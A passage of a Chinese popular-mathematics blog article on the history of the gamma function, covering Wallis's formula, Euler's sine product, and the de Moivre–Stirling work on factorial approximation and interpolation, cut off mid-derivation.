&lt;p&gt;伽玛函数不是初等函数，而是用积分形式定义的超越函数，怎么看都让人觉得不如初等函数自然亲切。然而伽玛函数也被称为阶乘函数，高等数学会告诉我们一个基本结论：伽玛函数是阶乘的推广。通过分部积分的方法，容易证明这个函数具有如下的递归性质&lt;br&gt;
$$\Gamma(x+1) = x \Gamma(x)$$&lt;br&gt;
由此可以推导出，对于任意的自然数$n$&lt;br&gt;
$$\Gamma(n) = (n-1)! .$$&lt;br&gt;
由于伽玛函数在整个实数轴上都有定义，于是可以看做阶乘概念在实数集上的延拓。&lt;/p&gt;
&lt;p&gt;如果我们继续再学习一些数学，就会惊奇地发现这个具有神秘气质的伽玛函数真是才华横溢。她栖身于现代数学的各个分支，在微积分、概率论、偏微分方程、组合数学， 甚至是看起来八竿子打不着的数论当中，都起着重要的作用。 并且这个函数绝非数学家们凭空臆想的一个抽象玩具，它具有极高的实用价值，频繁现身于在现代科学尤其是物理学之中。&lt;/p&gt;
&lt;p&gt;笔者对数学的涉猎很有限，主要是从概率统计中频繁地接触和学习这个函数，不过这个函数多年来一直都让我心存疑惑：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;都说$n!$ 和伽玛函数是近亲，可是从相貌上这两个数学公式都差了十万八千里，历史上数学家们是如何找到这个奇特的函数的？&lt;/li&gt;
&lt;li&gt; 现代数学对伽玛函数的定义使它满足 $\Gamma(n) = (n-1)!$，既然号称是$n!$ 的推广，为何定义伽玛函数的时候不让它满足$\Gamma(n) = n!$？这看起来不是更加舒服自然吗？&lt;/li&gt;
&lt;li&gt; 伽玛函数是唯一满足阶乘特性的推广函数吗？&lt;/li&gt;
&lt;li&gt; 伽玛函数在各种概率分布的密度函数中频繁出现，伽玛函数本身是否有直观的概率解释？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;带着这些疑问，笔者翻阅了许多讲解伽马函数历史和应用的资料，发现伽玛函数真是一个来自异族的美女，与生俱来携带着一种神秘的色彩。你要接近她并不难，然而她魅力独特，令你无法看透。从她出生开始，就吸引着众多一流的数学家对她进行解读。 历史上伽玛函数的发现，和数学家们对阶乘、插值以及积分的研究有着紧密的关系，而这最早要从著名的沃利斯公式讲起。&lt;br&gt;
&lt;span id=&quot;more-6646&quot;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二、无心插柳 — 沃利斯公式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1655年, 英国数学家沃利斯(John Wallis, 1616-1703)写下了一个神奇的数学公式&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{wallis-formula}&lt;br&gt;
\frac{2}{1} \cdot \frac{2}{3} \cdot \frac{4}{3} \cdot \frac{4}{5} \cdot&lt;br&gt;
\frac{6}{5} \cdot \frac{6}{7} \cdot \frac{8}{7} \cdot \frac{8}{9} \cdot \cdots =&lt;br&gt;
\frac{\pi}{2} .&lt;br&gt;
\end{equation}&lt;br&gt;
$\pi$ 居然可以如此齐整地表示成奇数、偶数的比值，着实令人惊讶。 历史上数学家们为了寻求对$\pi$ 这个迷人的常数更加深刻的理解，前赴后继倾注了无数的精力。数学家们发现，$\pi$ 可以表达成许许多多奇妙的形式，而沃利斯公式是欧洲历史上发现的第二个把 $\pi$ 表达成式了无穷序列的形式， 由于它简洁的对称美，也成为了许多数学人经常提及的数学公式之一。为何沃利斯公式会和伽玛函数发生联系呢？实际上对沃利斯公式做一下变形整理就可以得到如下等价形式&lt;br&gt;
$$ \lim_{n\rightarrow\infty} \frac{(2^n \cdot n!)^4}{[(2n)!]^2(2n+1)} = \frac{\pi}{2} $$&lt;br&gt;
我们看到了阶乘，所以沃利斯公式天然和阶乘有着紧密的联系。&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/john-wallis.jpg&quot;&gt;&lt;img class=&quot;aligncenter wp-image-175 &quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/john-wallis-248x300.jpg&quot; alt=&quot;john-wallis&quot; width=&quot;211&quot; height=&quot;255&quot;&gt;&lt;/a&gt;沃利斯&lt;/p&gt;
&lt;p&gt;我们先来欣赏一下沃利斯公式的证明。利用现代数学分析的知识证明这个公式并不难，通常微积分课本对这个公式的证明是从积分式&lt;br&gt;
$$ I(n) = \int_0^\pi \sin^nxdx $$&lt;br&gt;
出发，通过分部积分得到一个关于$I(n)$ 的递推公式，反复使用这个递推公式就可以证明结论。 不过这个证明思路有点繁琐，数学家波利亚(George P\’{o}lya, 1887-1985) 在它的名著《数学与合情推理》中提到了另外一个非常简洁、符合直觉，但是不够严格的证明思路，其中用到的最重要的公式是数学家欧拉(Leonhard Euler, 1707-1783)提供的。欧拉当年研究正弦函数 $\sin x$ 的时候，发现该函数有无穷多个零点 $0, \pm\pi, \pm 2\pi, \pm 3\pi, \cdots $。 而一个多项式$f(x)$ 如果有零点 $x_1, x_2, \cdots, x_n$(此处$x_i, x_j$ 可以相同, 对应于有重根的情形), 那么 $f(x)$ 一定可以表示为&lt;br&gt;
$$ f(x) = a_0 (x-x_1) (x-x_2) \cdots (x-x_n) .$$&lt;br&gt;
于是欧拉大胆地猜测 $\sin x$ 也具有多项式的这种性质，即&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{euler-sinx}&lt;br&gt;
\sin x = x \prod_{n=1}^\infty\left(1 – \frac{x^2}{n^2\pi^2}\right)&lt;br&gt;
= x (1- \frac{x^2}{\pi^2}) (1- \frac{x^2}{4\pi^2}) (1- \frac{x^2}{9\pi^2}) \cdots .&lt;br&gt;
\end{equation}&lt;br&gt;
理工科背景的学生大都学习过 $\sin x$ 的泰勒展开式， 通常只有数学背景的学生才会接触到这个 $\sin x$ 的无穷乘积展开式。这个展开式在数学推导中有许多妙用。数学史上它发挥的第一个重要作用，就是帮助欧拉推导出了如下美丽的公式&lt;br&gt;
$$ 1 + \frac{1}{2^2} + \frac{1}{3^2} + \frac{1}{4^2} + \cdots = \frac{\pi^2}{6} . $$&lt;br&gt;
这个展开式子的另一个妙处就是可以用于证明沃利斯公式， 不过这个思路并非欧拉本人给出，而是后来的数学家发现的。 在\eqref{euler-sinx} 式中取 $x=\frac{\pi}{2}$, 可以得到&lt;br&gt;
$$ 1 = \frac{\pi}{2} \prod_{n=1}^\infty\left(1 – \frac{1}{4n^2}\right)&lt;br&gt;
= \frac{\pi}{2} \prod_{n=1}^\infty\left(\frac{2n-1}{2n} \cdot \frac{2n+1}{2n}\right)&lt;br&gt;
$$&lt;br&gt;
所以&lt;br&gt;
$$ \frac{\pi}{2} = \prod_{n=1}^\infty\left(\frac{2n}{2n-1} \cdot \frac{2n}{2n+1}\right)&lt;br&gt;
$$&lt;br&gt;
上式就是沃利斯公式。之所以说以上的证明思路不够严格，是由于欧拉给的$\sin x$ 无穷乘积展开式的严格证明并不简单，依赖于现代数学分析理论。&lt;/p&gt;
&lt;p&gt;欣赏完沃利斯公式的证明，我们把镜头重新拉回到沃利斯生活的年代，要知道沃利斯给出这个公式是在 1655 年，那时候牛顿刚满13岁，莱布尼茨更小，欧拉还没出生，整个欧洲数学界对微积分的认识还停留在非常粗糙的阶段，对正弦函数 $\sin x$ 的认识也非常有限， 所以沃利斯当然不可能用上述的思路找到他的公式， 那沃利斯是如何发现这个 $\pi$ 的无穷乘积表达式的呢？&lt;/p&gt;
&lt;p&gt;在沃利斯的时代，微积分有了初步的进展，当时考虑的典型的问题就是求一个曲线和坐标轴围成的面积。欧洲的数学家们追寻阿基米德一千多年前开创的穷竭法，把曲线下的面积表达为求无穷多个矩形面积的和。当积分的思想在十七世纪开始逐步发酵的时候，沃利斯已经能够运用积分的思路处理一些简答曲线的面积。譬如，对于最简单的幂函数曲线 $y=x^n$，使用我们现在的数学记号， 沃利斯时代的数学家们获得了如下的结果&lt;br&gt;
$$ \int_0^1 x^n dx = \frac{1}{n+1}, n=0,1,2,\ldots .$$&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/circle-area.png&quot;&gt;&lt;img class=&quot;alignnone size-medium wp-image-167&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/circle-area-295x300.png&quot; alt=&quot;circle-area&quot; width=&quot;295&quot; height=&quot;300&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/circle-area.png&quot;&gt;求圆弧下的面积&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;圆的面积一直是千百年来数学家们深入关心和研究的问题，很自然地沃利斯也想到了可以使用同样的思路来处理圆的面积。 不过数学家们早已经证明道圆的面积是 $\pi r^2$，用积分的方法去计算圆的面积能带来什么好处呢？ 沃利斯在此做了一个逆向思维，他的真实目标并不是要计算圆的面积，而是冲着$\pi$ 去的。 沃利斯的一个漂亮的思路是：我们已经知道四分之一的单位圆圆弧 $y=\sqrt{1-x^2} (0 \le x \le 1)$ 和坐标轴围成的面积是 $\frac{\pi}{4}$, 如果这个面积能通过无穷分割的方法表达成一个解析表达式，那我们其实就可以得到计算 $\pi$ 的一个解析表达式。&lt;/p&gt;
&lt;p&gt;然而沃利斯在处理这个圆弧下地面积的时候遇到了困难。虽然基于无穷分割的方法可以得到&lt;br&gt;
$$ \int_0^1 (1-x^2)^{1/2} dx = \lim_{n\rightarrow \infty} \frac{1}{n} \sum^n_{k=1} \sqrt{1-\frac{k^2}{n^2}}$$&lt;br&gt;
但是这个极限难以简化计算。 沃利斯天才的地方就是换了一个更一般的思路来处理这个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt; 考虑更一般的曲线面积问题&lt;span style=&quot;line-height: 1.5;&quot;&gt;$$ A_{p,q} = \int_0^1 (1-x^\frac{1}{p})^q dx$$&lt;/span&gt;&lt;span style=&quot;line-height: 1.5;&quot;&gt;原来的问题变成了一个特例，就是计算 $A_{\frac{1}{2},\frac{1}{2}}$ ；&lt;/span&gt;
&lt;/li&gt;
&lt;li&gt; 对$p,q$ 为整数的情况做计算，并系统地列成表格， 从表格中观察变化规律，总结出一般的公式；&lt;/li&gt;
&lt;li&gt; 把计算公式从$p,q$为整数的情形延拓、内插到分数的情形，从而计算出&lt;span style=&quot;line-height: 1.5;&quot;&gt;$A_{\frac{1}{2},\frac{1}{2}}$ 。&lt;/span&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;沃利斯对 $p,q = 1,2,\ldots,10$ 做了计算， 发现$A_{p,q}$ 这个表格不太好看，改为倒数之后容易分析。于是取 $B_{p,q} = \frac{1}{A_{p,q}}$, 列出表格一看， 居然恰好是帕斯卡三角形！ 这个三角形中的组合数已经是数学家们熟悉知的， 于是沃利斯很容易地得到&lt;/p&gt;
&lt;p&gt;\begin{equation}&lt;br&gt;
\label{wallis-Bpq}&lt;br&gt;
B_{p,q} = \frac{(p+q)!} {p! q!} = \frac{1}{p!} (q+1) (q+2) \ldots (q+p), q=0,1,2 \ldots&lt;br&gt;
\end{equation}&lt;br&gt;
由上式进一步可以得到如下的递推公式&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{wallis-Bpq-recursion}&lt;br&gt;
B_{p,q} = \frac{p+q}{q} B_{p,q-1}&lt;br&gt;
\end{equation}&lt;br&gt;
原始的问题就转化为计算 $B_{\frac{1}{2},\frac{1}{2}}$。 由此开始， 沃利斯开始了他天才的推广：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt; 虽然 \eqref{wallis-Bpq} 和 \eqref{wallis-Bpq-recursion}是基于$p,q$ 为整数得到&lt;span style=&quot;line-height: 1.5;&quot;&gt;的， 但是沃利斯认为这个公式也应该适用于分数的情形；&lt;/span&gt;
&lt;/li&gt;
&lt;li&gt; 由于原始表格是对称的， 沃利斯相信推广到分数之后的表格依然保持对称性。&lt;/li&gt;
&lt;/ul&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/Bpq-table.png&quot;&gt;&lt;img class=&quot;alignnone wp-image-193 &quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/Bpq-table-1024x640.png&quot; alt=&quot;Bpq-table&quot; width=&quot;523&quot; height=&quot;327&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;基于对称性假设和计算式\eqref{wallis-Bpq}, 我们可以得到，&lt;br&gt;
$$ B_{\frac{1}{2}, 1} = B_{1, \frac{1}{2}} = \frac{1}{1!}(\frac{1}{2} + 1) = \frac{3}{2} $$&lt;br&gt;
考虑 $p=\frac{1}{2}$ 的情形, 重复使用迭代公式 \eqref{wallis-Bpq}, 容易得到&lt;br&gt;
$$ B_{\frac{1}{2}, m} = \frac{2m+1}{2m}\cdot \frac{2m-1}{2m-2} \ldots \frac{5}{4} \cdot\frac{3}{2} $$&lt;br&gt;
$$ B_{\frac{1}{2}, m+\frac{1}{2}} = \frac{2m+2}{2m+1} \cdot\frac{2m}{2m-1} \ldots \frac{4}{3}&lt;br&gt;
\cdot B_{\frac{1}{2}, \frac{1}{2}} $$&lt;br&gt;
由于 $B_{\frac{1}{2}, q}$ 是基于$q$ 递增的，所以有&lt;br&gt;
$$ B_{\frac{1}{2}, m-\frac{1}{2}} &amp;lt; B_{\frac{1}{2}, m} &amp;lt; B_{\frac{1}{2}, m+\frac{1}{2}} $$&lt;br&gt;
利用\eqref{wallis-Bpq-recursion} 式这个递推公式，马上可以得出上式两端有相同的极限&lt;br&gt;
$$ \lim_{m \rightarrow \infty} B_{\frac{1}{2}, m+\frac{1}{2}}&lt;br&gt;
= \lim_{m \rightarrow \infty} \frac{2m+2}{2m+1} B_{\frac{1}{2}, m-\frac{1}{2}}&lt;br&gt;
= \lim_{m \rightarrow \infty} B_{\frac{1}{2}, m-\frac{1}{2}} .&lt;br&gt;
$$&lt;br&gt;
于是，利用两侧极限的夹逼，可以得到&lt;br&gt;
$$ \lim_{m \rightarrow \infty} B_{\frac{1}{2}, m} = \lim_{m \rightarrow \infty} B_{\frac{1}{2}, m+\frac{1}{2}} $$&lt;br&gt;
即有&lt;br&gt;
$$&lt;br&gt;
\frac{3}{2} \cdot \frac{5}{4} \cdot \cdots \cdot \frac{2m-1}{2m-2} \cdot \frac{2m+1}{2m} \cdots&lt;br&gt;
= B_{\frac{1}{2}, \frac{1}{2}} \cdot \frac{4}{3} \cdot \cdots \cdot \frac{2m}{2m-1} \cdot \frac{2m+2}{2m+1} \cdot \cdots&lt;br&gt;
$$&lt;br&gt;
所以&lt;br&gt;
$$&lt;br&gt;
\frac{2}{B_{\frac{1}{2}, \frac{1}{2}}} = \frac{2}{1} \cdot\frac{2}{3} \cdot\frac{4}{3}\cdot \frac{4}{5}\cdot&lt;br&gt;
\cdots \cdot \frac{2m-2}{2m-1}\cdot \frac{2m}{2m-1} \cdot \frac{2m}{2m+1} \cdot \frac{2m+2}{2m+1} \cdot\cdots&lt;br&gt;
$$&lt;br&gt;
由于 $\displaystyle \frac{2}{B_{\frac{1}{2}, \frac{1}{2}}} = 2A_{\frac{1}{2}, \frac{1}{2}} = \frac{\pi}{2} $,代入上式就得到了沃利斯公式 \eqref{wallis-formula}。&lt;/p&gt;
&lt;p&gt;上述推导的基本思想是在沃利斯的名著《无穷分析》（Arithmetica Infinitorum，1655）中给出的。沃利斯公式对$\pi$ 的表示如此的奇特，以至于惠更斯第一次看见这个公式的时候根本不相信，直到有人给惠更斯展示了利用该公式对$\pi$做近似计算，才消除了惠更斯的疑惑。沃利斯是在牛顿之前英国最有影响力的数学家，他的这本书包含了现代微积分的先驱工作，给后来的数学家包括牛顿、斯特林、欧拉都产生了重要的影响。牛顿1642年在老家研读沃利斯的这本书的时候受到启发，从而把二项式定理从整数的情形推广到了分数的情形，这也是牛顿有生以来的第一个数学发现；而牛顿后续在微积分上的工作也同样受到了沃利斯的深刻影响。&lt;/p&gt;
&lt;p&gt;回过头来我们观察一下沃利斯公式推导过程中使用的\eqref{wallis-Bpq} 式，这个组合公式中实际上包含了阶乘$p!$、 $q!$, 当沃利斯认为这个公式也适合于$p, q$ 为分数的情形的时候，隐含了一个假设是阶乘这个源自整数的概念是可以推广到分数的情形的。虽然沃利斯并没有显示地提出把阶乘推广到分数的问题， 沃利斯对一些特殊积分式的研究、沃利斯公式的结论以及推导过程却给后来的数学家们进一步研究阶乘提供了许多重要的线索，也为未来伽玛函数的发现埋下了一颗种子。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二、近似与插值的艺术&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;十七世纪中期，由于帕斯卡、费马、贝努利等数学家的推动，概率论以及与之相关的组合数学获得了很大的发展，阶乘的数值计算开始频繁的出现在数学家面前。 真正的开始对 $n!$ 进行细致地研究并取得突破的，是数学家棣莫弗(Abraham de Moivre, 1667-1754)和斯特林(James Stirling, 1692-1770)。&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/abraham-de-moivre.jpg&quot;&gt;&lt;img class=&quot;alignnone size-medium wp-image-166&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/abraham-de-moivre-246x300.jpg&quot; alt=&quot;abraham-de-moivre&quot; width=&quot;246&quot; height=&quot;300&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;棣莫弗&lt;/p&gt;
&lt;p&gt;棣莫弗从1721年开始考虑二项分布的概率计算问题，其中一个问题是：当$n \rightarrow \infty $时，如何计算对称二项分布的中间项的概率&lt;br&gt;
$$ b\left(n, {1\over2}, {n \over 2}\right) = \binom{n}{{n \over 2}}&lt;br&gt;
\left(\frac{1}{2}\right)^n&lt;br&gt;
= \frac{n!}{({n\over 2})! \cdot ({n \over 2})!} \left(\frac{1}{2}\right)^n .$$&lt;br&gt;
上式中假设了$n$为偶数。棣莫弗经过一番复杂的推导计算，得到了如下的结果&lt;br&gt;
$$ b\left(n, {1\over2}, {n\over2}\right) \approx 2.168 \frac{(1 – {1\over n})^n} {\sqrt{n-1}}&lt;br&gt;
\approx \frac{2.168 e^{-1}}{\sqrt{n}}.$$&lt;br&gt;
1725年，斯特林得知了棣莫弗的研究问题和结果，这激起了他浓厚的兴趣。斯特林经过更细致的推导，得到了如下更加漂亮的结果&lt;br&gt;
$$ b\left(n, {1\over2}, {n\over2}\right) \approx \sqrt{\frac{2}{\pi n}} .$$&lt;br&gt;
斯特林写信告知了棣莫弗他的推导结果，斯特林的结果中最引人注目的地方就是 $\pi$ 的引入，这给棣莫弗很大的启发。 基于上述二项概率计算的研究，棣莫弗最终给出了如下重要公式&lt;br&gt;
$$ n! \approx C \sqrt{n} \left(\frac{n}{e}\right)^{n} $$&lt;br&gt;
$C$ 是一个常数。而在斯特林推导$b(n, {1\over2}, {n\over2})$ 过程中引入 $\pi$ 的启发下， 1730 年棣莫弗利用沃利斯公式推导出了 $C = \sqrt{2\pi}$，也就是得到了斯特林公式&lt;br&gt;
$$ n! \approx \sqrt{2\pi n} \left(\frac{n}{e}\right)^{n} .$$&lt;br&gt;
所以现代数学史的研究大都认为斯特林公式的最主要贡献者是棣莫弗，斯特林的贡献主要在常数$C$ 的确定。 不过科学发展史中长期以来都存在一个被称之为 Stigler’s Law 的著名现象：绝大多数科学成果的冠名，大都不是历史上首位发现者的名字。或许这主要是由于早年通信不发达、信息传播成本太高导致的。如今互联网如此的发达，学术界任何重要的科研进展都可以快速传导到世界各地，这种问题发生的概率大大的降低了，类似牛顿、莱布尼茨这种微积分发明权的世纪争夺战不太可能在这个时代重现。&lt;/p&gt;
&lt;p&gt;斯特林公式自发现以来，就吸引众多的数学家对它进行研究，提出了多种多样的证明方法。实际上，从沃利斯公式出发就可以证明斯特林公式，甚至可以进一步证明斯特林公式和沃利斯公式是完全等价的。在多种证明方法中，有一个基于概率论的证明思路：利用泊松分布的特性，再加上中心极限定理，我们可以简洁地推导出斯特林公式。&lt;/p&gt;
&lt;p&gt;假设 $X_1, X_2,\ldots, X_n $独立同分布， 都是服从参数 $\lambda=1$ 的泊松分布的随机变量，取 $S_n=\sum_{i=1}^n X_i$, 则由泊松分布的可叠加性， 容易知道 $S_n \sim Poisson(n)$, 于是由泊松分布的性质可知$S_n$ 的均值和方差都是 $n$, 利用中心极限定理可以得到&lt;br&gt;
$$ Z_n = \frac{S_n – E(S_n)}{\sqrt{ Var(S_n) }} = \frac{S_n – n}{{\sqrt n }} \rightarrow Z,  \quad Z \sim N(0,1) $$&lt;br&gt;
$Z$ 为正态分布随机变量，密度函数为&lt;br&gt;
$$ \displaystyle f(z)=\frac{1}{\sqrt{2\pi}}e^{-\frac{z^2}{2}} .$$&lt;br&gt;
所以，我们有如下推导&lt;br&gt;
\begin{eqnarray*}&lt;br&gt;
\begin{array}{lll}&lt;br&gt;
P\{{S_n} = n\} &amp;amp; = &amp;amp; \displaystyle P\{ n – 1 &amp;lt; {S_n} \le n\} \\&lt;br&gt;
&amp;amp; = &amp;amp; \displaystyle P\{ -\frac{1}{{\sqrt n }} &amp;lt; \frac{{{S_n} – n}}{{\sqrt n }} \le 0\} \\&lt;br&gt;
&amp;amp; \approx &amp;amp; \displaystyle P\{ -\frac{1}{{\sqrt n }} &amp;lt; Z \le 0\} \\&lt;br&gt;
&amp;amp; = &amp;amp; \displaystyle \int_{ – \frac{1}{{\sqrt n }}}^0 f(z) dz \\&lt;br&gt;
&amp;amp; \approx &amp;amp; f(0) [0 - ( - \frac{1}{{\sqrt n }})] \\&lt;br&gt;
&amp;amp; = &amp;amp; \displaystyle \frac{1}{\sqrt{2\pi n}} .\\&lt;br&gt;
\end{array}&lt;br&gt;
\end{eqnarray*}&lt;br&gt;
由于$S_n$ 符合参数$\lambda =n$ 的泊松分布，实际上有&lt;br&gt;
$$ P\{ {S_n} = n\} = \frac{{{e^{ – n}}{n^n}}}{{n!}} .$$&lt;br&gt;
综合以上推导可以得到&lt;br&gt;
$$ \frac{{{e^{ – n}}{n^n}}}{{n!}} \approx \frac{1}{\sqrt{2\pi n}}. $$&lt;br&gt;
上式稍微整理一下就得到斯特林公式。这个推导的思路看起来非常初等，但是由于中心极限定理的严格证明非常困难，所以不能被认为是一个严格的初等证明。不过该推导让我们从概率角度来理解斯特林公式，同时也解释了斯特林公式中的$\pi$ ，是由于正态分布的引入导致的。&lt;/p&gt;
&lt;p&gt;斯特林公式非常有用，通过它可以得出$n!$ 非常精确的估计值。虽然$n$ 足够大时绝对误差可以超过任何数，但是相对误差却很小，并且下降得非常快，甚至当 $n$ 很小的时候，斯特林公式的逼近都相当精确。&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/stirling-precision.png&quot;&gt;&lt;img class=&quot;alignnone wp-image-194 size-large&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/stirling-precision-1024x286.png&quot; alt=&quot;stirling-precision&quot; width=&quot;604&quot; height=&quot;168&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;不过，斯特林对于 $n!$ 的研究实际上走得更远，而不是仅限于近似计算。追寻沃利斯和牛顿在插值方面的工作，斯特林一直研究各种数列的插值问题，通俗地说就是把数列的通项公式定义从整数集合延拓到实数集合。例如数列 $1,4,9,16,\cdots$ 可以用通项公式 $n^2$ 自然的表达，即便 $n$ 为实数，这个通项公式也是良定义的。直观地说就是可以找到一条通过所有整数点$(n,n^2)$的平滑曲线$y=x^2$，从而可以把定义在整数集上的公式延拓到实数集合。再比如求和序列 $1, 1+2, 1+2+3, 1+2+3+4, 1+2+3+4+5 \cdots$, 其通项公式可以写为 $n(n+1)/2$ ，这个公式也可以很容易地延拓到实数集合上。 斯特林很擅长于处理各种序列的插值问题，他在1730 年出版的一本书中描述了很多基于多阶差分处理序列插值的方法，这些方法主要源自牛顿。 斯特林处理插值的思路稍微有点复杂，我们不在此赘述，他的方法本质上类似于使用多项式曲线做插值。我们知道平面上两个点可以确定一条直线，三个点可以确定一条抛物线，…，$n$+1 个点可以确定一条$n$次多项式曲线。所以对于一个整数序列，如果我们无法直观地写出通项公式，为了计算某一个实数点对应的值，可以用该实数点周围的 $n+1$个整数点去确定一条 $n$ 次多项式曲线，从而可以基于拟合得到的多项式近似地计算实数点的值。&lt;/p&gt;
&lt;p&gt;自然数的加法序列我们已经看到很容易做插值计算，对数学家们而言很自然的一个问题就是：自然数的乘法序列 $1,1\cdot2, 1\cdot2\cdot3, 1\cdot2\cdot3\cdot4, 1\cdot2\cdot3\cdot4\cdot5, \cdots$ 能否做插值计算？我们可以计算 $2!,3!$, 如何计算 $(\frac{1}{2})!$呢？斯特林在他的书中开始考虑阶乘序列$1!, 2!,3!,4!,5! \cdots$ 的插值问题。 如果我们把$(n,n!)$ 最初的一些点画在坐标轴上，确实可以看到，容易画出一条通过这些点的平滑曲线。&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/factorial1.png&quot;&gt;&lt;img class=&quot;alignnone wp-image-181 &quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/factorial1.png&quot; alt=&quot;factorial&quot; width=&quot;523&quot; height=&quot;104&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/factorial-curve.png&quot;&gt;&lt;img class=&quot;alignnone  wp-image-180&quot; src=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/factorial-curve.png&quot; alt=&quot;factorial-curve&quot; width=&quot;287&quot; height=&quot;209&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: center;&quot;&gt;&lt;a href=&quot;http://www.flickering.cn/wp-content/uploads/2014/06/factorial-curve.png&quot;&gt;通过$(n,n!)$的曲线&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;但是$n!$这个数列增长的速度过快，数值计算非常困难，要做这个序列的插值计算可不容易。幸运的是当时对数已经被纳皮尔(John Napier, 1550-1617) 发明出来，并且在数值计算上显示了其神通，被科学家们广泛接受。斯特林和棣莫弗在他们的研究中大量的使用对数做计算，所以很自然地斯特林转而考虑对序列 $\log_{10} n!$ 做插值计算。&lt;/p&gt;
&lt;p&gt;通过插值方法并结合对数运算的技巧，斯特林计算出了 $\log_{10} (10\frac{1}{2})!=7.0755259056$, 由此可以得到 $(10\frac{1}{2})! = 11899423.08$。斯特林接下来的处理非常有意思，由于原始的数列满足递归式 $T(z) = z \cdot T(z-1)$，所以斯特林基于插值的原则进行推理，认为被插值的中间项 $(\frac{1}{2})!, (1\frac{1}{2})!, (2\frac{1}{2})! \cdots,$ $ (9\frac{1}{2})!, (10\frac{1}{2})!$ 也应该满足这个递归式, 于是有&lt;br&gt;
$$ \left(10\frac{1}{2}\right)! = 10\frac{1}{2} \cdot&lt;br&gt;
9\frac{1}{2} \cdot \cdots \cdot 1\frac{1}{2} \cdot \left(\frac{1}{2}\right)! $$&lt;br&gt;
上式中代入$(10\frac{1}{2})!$的值，很容易计算得到&lt;br&gt;
$$\left(\frac{1}{2}\right)! = 0.8862269251 .$$&lt;br&gt;
这个结果看起来平淡无奇，然而斯特林天才地指出实际上有&lt;br&gt;
\begin{equation}&lt;br&gt;
\label{half-factorial}&lt;br&gt;
\left(\frac{1}{2}\right)! = \frac{\sqrt\pi}{2} .&lt;br&gt;
\end{equation}&lt;br&gt;
这真是一个令人惊诧的结果！&lt;/p&gt;
&lt;p&gt;我们不太确定斯特林是如何推断出 \eqref{half-factorial} 式的，因为在斯特林的论述中他只是把 $(\frac{1}{2})!$ 计算的结果和 $\frac{\sqrt\pi}{2}$ 做了数值比较，并没有进行严谨的数学推导，所以看起来好像是数值对比后猜测的结果。即便如此，这也展示了斯特林强大的数学直觉。&lt;/p&gt;
&lt;p&gt;然而考虑到我们熟悉的斯特林公式是斯特林和棣莫弗共同创造的，斯特林要利用他的插值过程更加严谨地推导这个结果其实也很容易，虽然没有证据表明斯特林做过这种推导。基于斯特林对 $\log_{10} n!$ 的插值处理方法，如果我们只是使用一次多项式（即直线）做插值处理，那么中间项的插值就是两端的算术平均&lt;br&gt;
$$ \log_{10} \left(n+\frac{1}{2}\right)! = \frac{\log_{10} n! + \log_{10} (n+1)!}{2} .$$&lt;br&gt;
所以&lt;br&gt;
$$ \left(n+\frac{1}{2}\right)! = \sqrt{n! (n+1)!} = n! \sqrt{n+1} ,$$&lt;br&gt;
把递归式 $T(z) = z \cdot T(z-1)$ 应用于 $(n+\frac{1}{2})!$ 可以得到&lt;br&gt;
$$ \left(n+\frac{1}{2}\right)!&lt;br&gt;
= (n+\frac{1}{2}) \cdot (n-\frac{1}{2}) \cdots \frac{3}{2} \cdot \left(\frac{1}{2}\right)! .$$&lt;br&gt;
利用斯特林公式推导可以得到&lt;br&gt;
\begin{align*}&lt;br&gt;
\left(\frac{1}{2}\right)! &amp;amp; = \frac {n! \sqrt{n+1}} {(n+\frac{1}{2})&lt;br&gt;
\cdot (n-\frac{1}{2}) \cdots \frac{3}{2}} \\&lt;br&gt;
&amp;amp; = \frac {\sqrt{n+1} \cdot 2^{2n} \cdot n! \cdot n!} {(2n+1)!} \\&lt;br&gt;
&amp;amp; \displaystyle \approx \displaystyle \frac {\sqrt{n+1} \cdot 2^{2n}&lt;br&gt;
\cdot \sqrt{2\pi n} (\frac{n}{e})^n \cdot \sqrt{2\pi n} (\frac{n}{e})^n}&lt;br&gt;
